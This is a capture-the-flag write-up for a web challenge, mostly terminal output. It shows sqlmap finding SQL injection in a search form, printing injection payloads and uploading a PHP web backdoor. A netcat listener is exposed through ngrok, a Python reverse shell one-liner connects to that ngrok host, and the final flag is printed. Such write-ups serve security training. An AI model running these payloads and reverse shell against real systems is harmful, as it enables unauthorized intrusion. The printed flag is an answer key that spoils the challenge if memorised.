# 0x01 Beanie Baby Collection
> 100pts

## Category
> Web

## Briefing
> We heard sql injection can give you shell but we don't believe it. Anyways, we have a huge collection of beanie baby here: http://bb.threatsims.com:8084/

> The flag format is unique

## Solution
Navigating to the website gives us the following:

![Beanie.png](Beanie.png)

Trying to input a backtick gives us the following:

![Beanie2.png](Beanie2.png)

We can use SQLMap and a reverse shell to gain access:

```console
CDSkids@kali:~/Desktop$ sqlmap -u "http://bb.threatsims.com:8084/index.php" --data "search=1" --batch --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:47:49 /2022-03-27/

[21:47:50] [INFO] testing connection to the target URL
[21:47:51] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:47:51] [INFO] testing if the target URL content is stable
[21:47:51] [INFO] target URL content is stable
[21:47:51] [INFO] testing if POST parameter 'search' is dynamic
[21:47:51] [INFO] POST parameter 'search' appears to be dynamic
[21:47:51] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[21:47:52] [INFO] testing for SQL injection on POST parameter 'search'
[21:47:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:47:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:47:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:47:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:47:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:47:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:47:56] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:47:56] [INFO] testing 'Generic inline queries'
[21:47:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:47:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:47:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:47:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:48:08] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:48:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:48:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:48:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:48:09] [INFO] target URL appears to have 5 columns in query
[21:48:09] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1' AND (SELECT 2428 FROM (SELECT(SLEEP(5)))zkXm) AND 'aujw'='aujw

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=1' UNION ALL SELECT CONCAT(0x7162766271,0x5057784e63496d6a7a74457572695576594b5a6b786952447352484f734861475456575476756b6e,0x7176787871),NULL,NULL,NULL,NULL-- -
---
[21:48:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:48:10] [INFO] fetching database names
available databases [2]:
[*] beanies
[*] information_schema

[21:48:10] [INFO] fetched data logged to text files under '/home/cdskids/.sqlmap/output/bb.threatsims.com'
[21:48:10] [WARNING] you haven't updated sqlmap for more than 723 days!!!

[*] ending @ 21:48:10 /2022-03-27/

CDSkids@kali:~/Desktop$ sqlmap -u "http://bb.threatsims.com:8084/index.php" --data "search=1" --batch --os-shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:48:27 /2022-03-27/

[21:48:27] [INFO] resuming back-end DBMS 'mysql'
[21:48:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1' AND (SELECT 2428 FROM (SELECT(SLEEP(5)))zkXm) AND 'aujw'='aujw

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=1' UNION ALL SELECT CONCAT(0x7162766271,0x5057784e63496d6a7a74457572695576594b5a6b786952447352484f734861475456575476756b6e,0x7176787871),NULL,NULL,NULL,NULL-- -
---
[21:48:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:48:28] [INFO] going to use a web backdoor for command prompt
[21:48:28] [INFO] fingerprinting the back-end DBMS operating system
[21:48:28] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] Y
[21:48:28] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1
[21:48:28] [WARNING] unable to automatically parse any web server path
[21:48:28] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[21:48:29] [WARNING] unable to upload the file stager on '/var/www/'
[21:48:29] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[21:48:29] [WARNING] expect junk characters inside the file as a leftover from UNION query
[21:48:29] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[21:48:29] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[21:48:30] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://bb.threatsims.com:8084/tmpuzofc.php
[21:48:30] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://bb.threatsims.com:8084/tmpbqkkf.php
[21:48:30] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
```

In another terminal setup a Netcat listener:

```console
CDSkids@kali:~/Desktop$ nc -nlvp 4449
Listening on 0.0.0.0 4449
```

Annnnnnd another terminal:

```console
CDSkids@kali:~/Desktop$ ngrok 4449
ngrok by @inconshreveable                                                        (Ctrl+C to quit)                                                                                                 Session Status                online
Account                       (Plan: Free)
Version                       2.3.40
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ngrok.io:15083 -> localhost:4449

Connections                   ttl     opn     rt1     rt5     p50     p90
                              6       0       0.05    0.02    0.00    1.99  
```

In our original SQLMap terminal we can now run a Python reverse shell script:

```console
os-shell> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",15083));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess
.call(["/bin/sh","-i"]);'
do you want to retrieve the command standard output? [Y/n/a] Y
No output
os-shell>
```

Finally, the magic can happen in our Netcat listener shell:

```console
Connection received on 127.0.0.1 63013
/bin/sh: 0: can't access tty; job control turned off
$ python -c"import pty;pty.spawn('/bin/bash')"
www-data@54591b768b7d:/var/www/beanie$ ls
ls
404.php         shell.php     tmpbwaak.php  tmpuqezd.php  tmpuvybi.php
bb.sql          tmpbaibx.php  tmpbzwgk.php  tmpusjtl.php  tmpuyolj.php
beanie-img.jpg  tmpbaxfd.php  tmpuacgw.php  tmputggm.php  tmpuzofc.php
cmd.php         tmpbnncr.php  tmpuffok.php  tmputsgz.php  tmpuzxjr.php
flag.txt        tmpbqkkf.php  tmpufvtz.php  tmpuuplv.php
index.php       tmpbvwwj.php  tmpulnup.php  tmpuvrgo.php
www-data@54591b768b7d:/var/www/beanie$ cat flag.txt
cat flag.txt
feb97c029900494760ee09f9ff89da84
www-data@54591b768b7d:/var/www/beanie$
```

## Flag
Flag: `feb97c029900494760ee09f9ff89da84`